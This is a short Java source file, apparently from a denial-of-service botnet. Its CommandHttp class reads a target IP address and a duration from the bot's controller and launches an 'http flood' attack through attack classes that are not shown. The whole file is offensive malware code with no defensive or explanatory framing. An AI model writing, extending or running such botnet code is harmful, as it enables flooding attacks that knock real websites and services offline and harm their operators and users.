package commands;

import attack.Attack;
import attack.HTTP;
import bot.Main;

public class CommandHttp extends Command {

	/**
	 * Initializes http flood
	 */
	@Override
	public void perform() throws Exception {
		String ip = Main.readString();
		int time = Main.readInt();
		
		Attack attack = new HTTP(ip);
		Attack.begin(time, attack);
	}

}
